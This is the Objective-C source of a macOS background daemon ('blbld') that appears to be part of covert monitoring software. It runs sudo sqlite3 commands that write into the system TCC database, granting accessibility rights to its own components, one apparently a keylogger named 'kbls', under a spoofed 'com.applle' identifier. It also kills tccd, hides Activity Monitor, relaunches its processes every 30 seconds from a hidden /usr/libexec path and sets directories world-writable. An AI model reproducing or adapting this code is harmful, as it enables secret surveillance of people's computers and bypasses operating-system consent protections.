//
//  blbldAppDelegate.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "blbldAppDelegate.h"
#import "blbldUtils.h"
#import "NotificationManager.h"
#import "AppTerminateMonitor.h"
#import "ActivityHider.h"
#import "DaemonPrivateHome.h"

#import <SystemConfiguration/SystemConfiguration.h>
#include <sys/sysctl.h>

@interface blbldAppDelegate (private)
- (void) setUpHomeDirectory;
- (void) touchAccessibility;
- (void) launch;
- (void) runIfNecessary;

- (void) launchKBLS;

- (void) registerDeviceLogoff;
- (void) unregisterDeviceLogoff;
- (void) deviceLogoff: (NSNotification *) aNotification;

@end

@implementation blbldAppDelegate

@synthesize window;
@synthesize mArgs, mNotificationManager, mAppTerminateMonitor;
@synthesize mActivityHider;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    [self setMArgs:args];
    DLog(@"###### FinishLaunching Launching args, %@", self.mArgs);
    
    // -- Prepare home directory
    [self setUpHomeDirectory];

    // -- Touch accessibility
    [self touchAccessibility];
    
    // -- Launch
    [self launch];
    [self launchKBLS];
    
    // -- Monitor update or uninstallation
    mNotificationManager = [[NotificationManager alloc]init];
    [mNotificationManager startWatching];
    
    // -- Monitor blblu die
    mAppTerminateMonitor = [[AppTerminateMonitor alloc] init];
    [mAppTerminateMonitor setMDelegate:self];
    [mAppTerminateMonitor setMSelector:@selector(runIfNecessary)];
    [mAppTerminateMonitor setMProcessName:[self.mArgs objectAtIndex:2]];
    [mAppTerminateMonitor start];
    
    // -- Detect kbls die
    mKBLSTerminateDetector = [[AppTerminateMonitor alloc] init];
    [mKBLSTerminateDetector setMDelegate:self];
    [mKBLSTerminateDetector setMSelector:@selector(runIfNecessary)];
    [mKBLSTerminateDetector setMProcessName:[self.mArgs objectAtIndex:5]];
    [mKBLSTerminateDetector start];
    
    // -- Activity Monitor
    mActivityHider = [[ActivityHider alloc]init];
    [mActivityHider start];
    
    if ([blbldUtils isActivityMonitorIsRunning]) {
        [blbldUtils hideActivityMonitor];
    }
    
    // -- Watch dog timer
    mKeepLiveTimer = [NSTimer scheduledTimerWithTimeInterval:30
                                                      target:self
                                                    selector:@selector(runIfNecessary)
                                                    userInfo:nil
                                                     repeats:YES];
    

    
    [self registerDeviceLogoff];
}

#pragma mark Private methods
#pragma mark -

- (void) setUpHomeDirectory {
    NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
    NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
    NSString *command = [NSString stringWithFormat:@"chmod -R 777 %@", sharedHome];
    system([command cStringUsingEncoding:NSUTF8StringEncoding]);
    
    NSString* etcPath = [privateHome stringByAppendingString:@"etc/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:etcPath];
    command = [NSString stringWithFormat:@"chmod -R 777 %@", etcPath];
    system([command cStringUsingEncoding:NSUTF8StringEncoding]);
}

- (void) touchAccessibility {
    SInt32 OSXversionMajor = 0, OSXversionMinor = 0;
    if(Gestalt(gestaltSystemVersionMajor, &OSXversionMajor) == noErr && Gestalt(gestaltSystemVersionMinor, &OSXversionMinor) == noErr)
    {
        // 10.6 - 10.8
        if(OSXversionMajor == 10 && OSXversionMinor >= 6 && OSXversionMajor == 10 && OSXversionMinor <= 8 ) {
            system("sudo touch /private/var/db/.AccessibilityAPIEnabled");
        }
        // >= 10.9 - 10.10
        else if(OSXversionMajor == 10 && OSXversionMinor >= 9 && OSXversionMajor == 10 && OSXversionMinor <= 10 ) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blblu',0,1,1,NULL);\"");
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.kbls',0,1,1,NULL);\"");
        }
        // >= 10.11
        else if(OSXversionMajor == 10 && OSXversionMinor >= 11) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blblu',0,1,1,NULL,NULL);\"");
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.kbls',0,1,1,NULL,NULL);\"");
        }
    }
    
    // Make touch take effect
    system("sudo killall -9 tccd");
}

- (void) launch {
    uid_t uid				= 0;
    gid_t gid				= 0;
    NSString *username =  (NSString *)SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid);
    DLog(@"username = %@", username);
    
    /**********************************************************************************************************
     Arguments:
     0 /usr/libexec/.blblu/blblu/Contents/Resources/Launch.sh
     1 /usr/libexec/.blblu/blblu/Contents/MacOS/blblu
     2 blblu
     3 blblu-load-all
     4 /usr/libexec/.blblu/blblu/Contents/Resources/kbls.app/Contents/MacOS/kbls
     5 kbls
     6 kbls-load-all
     
     >> sudo -u TARGETUSERNAME open -a /usr/libexec/.blblu/blblu/Contents/MacOS/blblu --args blblu-load-all
     **********************************************************************************************************/
    
    NSString *charCmd = [NSString stringWithFormat:@"sudo -u %@ open -a %@ --args %@", username, [[self mArgs] objectAtIndex:1], [[self mArgs] objectAtIndex:3]];
    system([charCmd UTF8String]);
    [username release];
    DLog(@"charCmd = %@", charCmd);
}

- (void) launchKBLS {
    uid_t uid				= 0;
    gid_t gid				= 0;
    NSString *username =  (NSString *)SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid);
    DLog(@"username = %@", username);
    
    /****************************************************************************************************************************************
     Arguments:
     0 /usr/libexec/.blblu/blblu/Contents/Resources/Launch.sh
     1 /usr/libexec/.blblu/blblu/Contents/MacOS/blblu
     2 blblu
     3 blblu-load-all
     4 /usr/libexec/.blblu/blblu/Contents/Resources/kbls.app/Contents/MacOS/kbls
     5 kbls
     6 kbls-load-all
     
     >> sudo -u TARGETUSERNAME open -a /usr/libexec/.blblu/blblu/Contents/Resources/kbls.app/Contents/MacOS/kbls --args blblu-load-all
     ****************************************************************************************************************************************/
    
    NSString *charCmd = [NSString stringWithFormat:@"sudo -u %@ open -a %@ --args %@", username, [[self mArgs] objectAtIndex:4], [[self mArgs] objectAtIndex:6]];
    system([charCmd UTF8String]);
    [username release];
    DLog(@"charCmd = %@", charCmd);
}

- (void) runIfNecessary {
    DLog(@"Attempts to check and run if necessary");
    BOOL shouldStart = true;
    BOOL shouldStartKBLS = true;
    
    NSString *blbluProcessName = [[self mArgs] objectAtIndex:2];
    NSString *kblsProcessName = [self.mArgs objectAtIndex:5];
    NSArray * temp = [blbldUtils getRunnigProcesses];
    for (int i=0; i<[temp count]; i++) {
        NSDictionary * tempdic = [temp objectAtIndex:i];
        NSString *processName = [NSString stringWithFormat:@"%@",[tempdic objectForKey:kRunningProcessNameTag]];
        if([processName isEqualToString:blbluProcessName]) {
            shouldStart = false;
        }
        if ([processName isEqualToString:kblsProcessName]) {
            shouldStartKBLS = false;
        }
    }
    DLog(@"shouldStart : %d, shouldStartKBLS : %d", shouldStart, shouldStartKBLS);

    if (shouldStart || shouldStartKBLS) {
        [self setUpHomeDirectory];
        
        [self touchAccessibility];
    }
    
    // blblu
    if (shouldStart) {
        [self launch];
        
        [mAppTerminateMonitor stop];
        [mAppTerminateMonitor start];
    }
    
    // kbls
    if (shouldStartKBLS) {
        [self launchKBLS];
        
        [mKBLSTerminateDetector stop];
        [mKBLSTerminateDetector start];
    }
}

- (void) registerDeviceLogoff {
    DLog(@"Register user logoff notification");
    NSNotificationCenter *nc = [[NSWorkspace sharedWorkspace] notificationCenter];
    [nc addObserver:self selector:@selector(deviceLogoff:) name:NSWorkspaceWillPowerOffNotification object:nil];
}

- (void) unregisterDeviceLogoff {
    DLog(@"Unregister user logoff notification");
    NSNotificationCenter *nc = [[NSWorkspace sharedWorkspace] notificationCenter];
    [nc removeObserver:self name:NSWorkspaceWillPowerOffNotification object:nil];
}

- (void) deviceLogoff:(NSNotification *)aNotification {
    DLog(@"Daemon detects user logoff");
    
    if (mKeepLiveTimer) {
        [mKeepLiveTimer invalidate];
        mKeepLiveTimer = nil;
    }
    
    [mAppTerminateMonitor stop];
    [mKBLSTerminateDetector stop];
}

#pragma mark Memory management
#pragma mark -

- (void) dealloc {
    [self unregisterDeviceLogoff];
    [mActivityHider stop];
    [mActivityHider release];
    [mAppTerminateMonitor stop];
    [mAppTerminateMonitor release];
    [mKBLSTerminateDetector stop];
    [mKBLSTerminateDetector release];
    [mNotificationManager release];
    [mArgs release];
    [super dealloc];
}

@end
